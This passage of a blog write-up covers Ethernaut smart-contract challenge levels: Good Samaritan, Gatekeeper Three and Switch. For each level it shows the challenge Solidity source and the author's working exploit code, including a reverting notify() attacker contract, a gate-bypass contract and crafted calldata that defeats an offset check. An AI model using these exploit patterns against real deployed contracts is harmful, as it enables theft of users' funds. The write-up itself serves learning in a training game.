</span><span>        </span><span style=color:#616e88>// one million coins for Good Samaritan initially
</span><span>        balances[wallet_] </span><span style=color:#81a1c1>= </span><span style=color:#b48ead>10</span><span style=color:#81a1c1>**</span><span style=color:#b48ead>6</span><span>;
</span><span>    }
</span><span>
</span><span>    function </span><span style=color:#88c0d0>transfer</span><span>(</span><span style=color:#81a1c1>address </span><span>dest_, </span><span style=color:#81a1c1>uint256 </span><span>amount_) </span><span style=color:#81a1c1>external </span><span>{
</span><span>        </span><span style=color:#81a1c1>uint256</span><span> currentBalance </span><span style=color:#81a1c1>=</span><span> balances[</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>];
</span><span>
</span><span>        </span><span style=color:#616e88>// transfer only occurs if balance is enough
</span><span>        if(amount_ </span><span style=color:#81a1c1><=</span><span> currentBalance) {
</span><span>            balances[</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>] </span><span style=color:#81a1c1>-=</span><span> amount_;
</span><span>            balances[dest_] </span><span style=color:#81a1c1>+=</span><span> amount_;
</span><span>
</span><span>            if(dest_.</span><span style=color:#88c0d0>isContract</span><span>()) {
</span><span>                </span><span style=color:#616e88>// notify contract 
</span><span>                </span><span style=color:#88c0d0>INotifyable</span><span>(dest_).</span><span style=color:#88c0d0>notify</span><span>(amount_);
</span><span>            }
</span><span>        } else {
</span><span>            revert </span><span style=color:#88c0d0>InsufficientBalance</span><span>(currentBalance, amount_);
</span><span>        }
</span><span>    }
</span><span>}
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Wallet </span><span>{
</span><span>    </span><span style=color:#616e88>// The owner of the wallet instance
</span><span>    </span><span style=color:#81a1c1>address public</span><span> owner;
</span><span>
</span><span>    Coin </span><span style=color:#81a1c1>public </span><span>coin;
</span><span>
</span><span>    error </span><span style=color:#88c0d0>OnlyOwner</span><span>();
</span><span>    error </span><span style=color:#88c0d0>NotEnoughBalance</span><span>();
</span><span>
</span><span>    modifier </span><span style=color:#88c0d0>onlyOwner</span><span>() {
</span><span>        if(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender !=</span><span> owner) {
</span><span>            revert </span><span style=color:#88c0d0>OnlyOwner</span><span>();
</span><span>        }
</span><span>        _;
</span><span>    }
</span><span>
</span><span>    constructor() {
</span><span>        owner </span><span style=color:#81a1c1>= msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>;
</span><span>    }
</span><span>
</span><span>    function </span><span style=color:#88c0d0>donate10</span><span>(</span><span style=color:#81a1c1>address </span><span>dest_) </span><span style=color:#81a1c1>external onlyOwner </span><span>{
</span><span>        </span><span style=color:#616e88>// check balance left
</span><span>        if (coin.</span><span style=color:#88c0d0>balances</span><span>(</span><span style=color:#81a1c1>address</span><span>(</span><span style=color:#81a1c1>this</span><span>)) </span><span style=color:#81a1c1>< </span><span style=color:#b48ead>10</span><span>) {
</span><span>            revert </span><span style=color:#88c0d0>NotEnoughBalance</span><span>();
</span><span>        } else {
</span><span>            </span><span style=color:#616e88>// donate 10 coins
</span><span>            coin.</span><span style=color:#88c0d0>transfer</span><span>(dest_, </span><span style=color:#b48ead>10</span><span>);
</span><span>        }
</span><span>    }
</span><span>
</span><span>    function </span><span style=color:#88c0d0>transferRemainder</span><span>(</span><span style=color:#81a1c1>address </span><span>dest_) </span><span style=color:#81a1c1>external onlyOwner </span><span>{
</span><span>        </span><span style=color:#616e88>// transfer balance left
</span><span>        coin.</span><span style=color:#88c0d0>transfer</span><span>(dest_, coin.</span><span style=color:#88c0d0>balances</span><span>(</span><span style=color:#81a1c1>address</span><span>(</span><span style=color:#81a1c1>this</span><span>)));
</span><span>    }
</span><span>
</span><span>    function </span><span style=color:#88c0d0>setCoin</span><span>(Coin coin_) </span><span style=color:#81a1c1>external onlyOwner </span><span>{
</span><span>        coin </span><span style=color:#81a1c1>=</span><span> coin_;
</span><span>    }
</span><span>}
</span><span>
</span><span>interface </span><span style=color:#88c0d0>INotifyable </span><span>{
</span><span>    function </span><span style=color:#88c0d0>notify</span><span>(</span><span style=color:#81a1c1>uint256 </span><span>amount) </span><span style=color:#81a1c1>external</span><span>;
</span><span>}
</span></code></pre><p>uh… just throw a same custom error in <code>Notifyable</code> contract. Kinda easy(?<pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity >=</span><span style=color:#b48ead>0.8.0 </span><span><</span><span style=color:#b48ead>0.9.0</span><span>;
</span><span>interface </span><span style=color:#88c0d0>IGoodSamaritan </span><span>{
</span><span>    function </span><span style=color:#88c0d0>requestDonation</span><span>() </span><span style=color:#81a1c1>external </span><span>returns (</span><span style=color:#81a1c1>bool</span><span> enoughBalance);
</span><span>}
</span><span>contract </span><span style=color:#88c0d0>Attacker </span><span>{
</span><span>    error </span><span style=color:#88c0d0>NotEnoughBalance</span><span>();
</span><span>    IGoodSamaritan _GoodSamaritan;
</span><span>    constructor (</span><span style=color:#81a1c1>address </span><span>_addr){
</span><span>        _GoodSamaritan </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>IGoodSamaritan</span><span>(_addr);
</span><span>    }
</span><span>    function </span><span style=color:#88c0d0>attack </span><span>() </span><span style=color:#81a1c1>public </span><span>{
</span><span>        _GoodSamaritan.</span><span style=color:#88c0d0>requestDonation</span><span>(); 
</span><span>    }
</span><span>    function </span><span style=color:#88c0d0>notify</span><span>(</span><span style=color:#81a1c1>uint256 </span><span>amount) </span><span style=color:#81a1c1>pure external </span><span>{
</span><span>        if(amount </span><span style=color:#81a1c1>== </span><span style=color:#b48ead>10</span><span>){
</span><span>			revert </span><span style=color:#88c0d0>NotEnoughBalance</span><span>();
</span><span>        }
</span><span>    }
</span><span>}
</span></code></pre><h2 id=gatekeeper-three>Gatekeeper Three</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>contract </span><span style=color:#88c0d0>SimpleTrick </span><span>{
</span><span>  GatekeeperThree </span><span style=color:#81a1c1>public </span><span>target;
</span><span>  </span><span style=color:#81a1c1>address public</span><span> trick;
</span><span>  </span><span style=color:#81a1c1>uint private</span><span> password </span><span style=color:#81a1c1>= block</span><span>.</span><span style=color:#81a1c1>timestamp</span><span>;
</span><span>
</span><span>  constructor (</span><span style=color:#81a1c1>address payable </span><span>_target) {
</span><span>    target </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>GatekeeperThree</span><span>(_target);
</span><span>  }
</span><span>    
</span><span>  function </span><span style=color:#88c0d0>checkPassword</span><span>(</span><span style=color:#81a1c1>uint </span><span>_password) </span><span style=color:#81a1c1>public </span><span>returns (</span><span style=color:#81a1c1>bool</span><span>) {
</span><span>    if (_password </span><span style=color:#81a1c1>==</span><span> password) {
</span><span>      return </span><span style=color:#81a1c1>true</span><span>;
</span><span>    }
</span><span>    password </span><span style=color:#81a1c1>= block</span><span>.</span><span style=color:#81a1c1>timestamp</span><span>;
</span><span>    return </span><span style=color:#81a1c1>false</span><span>;
</span><span>  }
</span><span>    
</span><span>  function </span><span style=color:#88c0d0>trickInit</span><span>() </span><span style=color:#81a1c1>public </span><span>{
</span><span>    trick </span><span style=color:#81a1c1>= address</span><span>(</span><span style=color:#81a1c1>this</span><span>);
</span><span>  }
</span><span>    
</span><span>  function </span><span style=color:#88c0d0>trickyTrick</span><span>() </span><span style=color:#81a1c1>public </span><span>{
</span><span>    if (</span><span style=color:#81a1c1>address</span><span>(</span><span style=color:#81a1c1>this</span><span>) </span><span style=color:#81a1c1>== msg</span><span>.</span><span style=color:#81a1c1>sender && address</span><span>(</span><span style=color:#81a1c1>this</span><span>) </span><span style=color:#81a1c1>!=</span><span> trick) {
</span><span>      target.</span><span style=color:#88c0d0>getAllowance</span><span>(password);
</span><span>    }
</span><span>  }
</span><span>}
</span><span>
</span><span>contract </span><span style=color:#88c0d0>GatekeeperThree </span><span>{
</span><span>  </span><span style=color:#81a1c1>address public</span><span> owner;
</span><span>  </span><span style=color:#81a1c1>address public</span><span> entrant;
</span><span>  </span><span style=color:#81a1c1>bool public</span><span> allowEntrance;
</span><span>
</span><span>  SimpleTrick </span><span style=color:#81a1c1>public </span><span>trick;
</span><span>
</span><span>  function </span><span style=color:#88c0d0>construct0r</span><span>() </span><span style=color:#81a1c1>public </span><span>{
</span><span>      owner </span><span style=color:#81a1c1>= msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>;
</span><span>  }
</span><span>
</span><span>  modifier </span><span style=color:#88c0d0>gateOne</span><span>() {
</span><span>    require(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender ==</span><span> owner);
</span><span>    require(</span><span style=color:#81a1c1>tx</span><span>.</span><span style=color:#81a1c1>origin !=</span><span> owner);
</span><span>    _;
</span><span>  }
</span><span>
</span><span>  modifier </span><span style=color:#88c0d0>gateTwo</span><span>() {
</span><span>    require(allowEntrance </span><span style=color:#81a1c1>== true</span><span>);
</span><span>    _;
</span><span>  }
</span><span>
</span><span>  modifier </span><span style=color:#88c0d0>gateThree</span><span>() {
</span><span>    if (</span><span style=color:#81a1c1>address</span><span>(</span><span style=color:#81a1c1>this</span><span>).balance </span><span style=color:#81a1c1>> </span><span style=color:#b48ead>0.001 ether </span><span style=color:#81a1c1>&& payable</span><span>(owner).</span><span style=color:#88c0d0>send</span><span>(</span><span style=color:#b48ead>0.001 ether</span><span>) </span><span style=color:#81a1c1>== false</span><span>) {
</span><span>      _;
</span><span>    }
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>getAllowance</span><span>(</span><span style=color:#81a1c1>uint </span><span>_password) </span><span style=color:#81a1c1>public </span><span>{
</span><span>    if (trick.</span><span style=color:#88c0d0>checkPassword</span><span>(_password)) {
</span><span>        allowEntrance </span><span style=color:#81a1c1>= true</span><span>;
</span><span>    }
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>createTrick</span><span>() </span><span style=color:#81a1c1>public </span><span>{
</span><span>    trick </span><span style=color:#81a1c1>= </span><span>new </span><span style=color:#88c0d0>SimpleTrick</span><span>(</span><span style=color:#81a1c1>payable</span><span>(</span><span style=color:#81a1c1>address</span><span>(</span><span style=color:#81a1c1>this</span><span>)));
</span><span>    trick.</span><span style=color:#88c0d0>trickInit</span><span>();
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>enter</span><span>() </span><span style=color:#81a1c1>public gateOne gateTwo gateThree </span><span>{
</span><span>    entrant </span><span style=color:#81a1c1>= tx</span><span>.</span><span style=color:#81a1c1>origin</span><span>;
</span><span>  }
</span><span>
</span><span>  receive () </span><span style=color:#81a1c1>external payable </span><span>{}
</span><span>}
</span></code></pre><p>SimpleTrick is a sub-contract of GateKeeperThree. Nothing new here.<pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span>... </span><span style=color:#616e88>// all code from challenge source
</span><span>contract </span><span style=color:#88c0d0>gateBreaker </span><span>{
</span><span>    GatekeeperThree _GatekeeperThree;
</span><span>    constructor (</span><span style=color:#81a1c1>address payable </span><span>_addr) {
</span><span>        _GatekeeperThree </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>GatekeeperThree</span><span>(_addr); 
</span><span>    }
</span><span>    function </span><span style=color:#88c0d0>exp1</span><span>() </span><span style=color:#81a1c1>external </span><span>{
</span><span>        _GatekeeperThree.</span><span style=color:#88c0d0>createTrick</span><span>();
</span><span>        _GatekeeperThree.</span><span style=color:#88c0d0>construct0r</span><span>();
</span><span>    }
</span><span>    </span><span style=color:#616e88>// Dont forget to transfer >0.001 eth to gateKeeper
</span><span>    function </span><span style=color:#88c0d0>exp2</span><span>(</span><span style=color:#81a1c1>uint </span><span>pass) </span><span style=color:#81a1c1>external </span><span>{
</span><span>        _GatekeeperThree.</span><span style=color:#88c0d0>getAllowance</span><span>(pass);
</span><span>        _GatekeeperThree.</span><span style=color:#88c0d0>enter</span><span>();
</span><span>    }
</span><span>    fallback() </span><span style=color:#81a1c1>external </span><span>{ }
</span><span>}
</span></code></pre><h2 id=switch>Switch</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Switch </span><span>{
</span><span>    </span><span style=color:#81a1c1>bool public</span><span> switchOn; </span><span style=color:#616e88>// switch is off
</span><span>    </span><span style=color:#81a1c1>bytes4 public</span><span> offSelector </span><span style=color:#81a1c1>= bytes4</span><span>(</span><span style=color:#81a1c1>keccak256</span><span>("turnSwitchOff()"));
</span><span>
</span><span>     modifier </span><span style=color:#88c0d0>onlyThis</span><span>() {
</span><span>        require(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender == address</span><span>(</span><span style=color:#81a1c1>this</span><span>), "Only the contract can call this");
</span><span>        _;
</span><span>    }
</span><span>
</span><span>    modifier </span><span style=color:#88c0d0>onlyOff</span><span>() {
</span><span>        </span><span style=color:#616e88>// we use a complex data type to put in memory
</span><span>        </span><span style=color:#81a1c1>bytes32</span><span>[</span><span style=color:#b48ead>1</span><span>] </span><span style=color:#81a1c1>memory </span><span>selector;
</span><span>        </span><span style=color:#616e88>// check that the calldata at position 68 (location of _data)
</span><span>        assembly {
</span><span>            </span><span style=color:#88c0d0>calldatacopy</span><span>(selector, </span><span style=color:#b48ead>68</span><span>, </span><span style=color:#b48ead>4</span><span>) </span><span style=color:#616e88>// grab function selector from calldata
</span><span>        }
</span><span>        require(
</span><span>            selector[</span><span style=color:#b48ead>0</span><span>] </span><span style=color:#81a1c1>==</span><span> offSelector,
</span><span>            "Can only call the turnOffSwitch function"
</span><span>        );
</span><span>        _;
</span><span>    }
</span><span>
</span><span>    function </span><span style=color:#88c0d0>flipSwitch</span><span>(</span><span style=color:#81a1c1>bytes memory </span><span>_data) </span><span style=color:#81a1c1>public onlyOff </span><span>{
</span><span>        (</span><span style=color:#81a1c1>bool</span><span> success, ) </span><span style=color:#81a1c1>= address</span><span>(</span><span style=color:#81a1c1>this</span><span>).</span><span style=color:#81a1c1>call</span><span>(_data);
</span><span>        require(success, "call failed :(");
</span><span>    }
</span><span>
</span><span>    function </span><span style=color:#88c0d0>turnSwitchOn</span><span>() </span><span style=color:#81a1c1>public onlyThis </span><span>{
</span><span>        switchOn </span><span style=color:#81a1c1>= true</span><span>;
</span><span>    }
</span><span>
</span><span>    function </span><span style=color:#88c0d0>turnSwitchOff</span><span>() </span><span style=color:#81a1c1>public onlyThis </span><span>{
</span><span>        switchOn </span><span style=color:#81a1c1>= false</span><span>;
</span><span>    }
</span><span>
</span><span>}
</span></code></pre><p>about how CALLDATA is encoded: <a href=https://docs.soliditylang.org/en/v0.8.17/abi-spec.html#use-of-dynamic-types>official doc</a>, <a href=https://blog.softbinator.com/solving-ethernaut-level-29-switch/>others writeup</a><p>Briefly saying, Calldata Encoding Essentials for Dynamic Types, including string, bytes and arrays, encode using <code>offset - length - data</code> segment to encoding. Allowing us to bypass the check by modifying the offset.<p>by moving the data content(length and value) after the address param(to):<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#81a1c1>await </span><span style=color:#88c0d0>sendTransaction</span><span>({from</span><span style=color:#eceff4>: </span><span>player</span><span style=color:#eceff4>, </span><span>to</span><span style=color:#eceff4>: </span><span>contract</span><span style=color:#81a1c1>.</span><span>address</span><span style=color:#eceff4>, </span><span>data</span><span style=color:#eceff4>:</span><span style=color:#a3be8c>"0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"</span><span>})
</span></code></pre></div></div></section>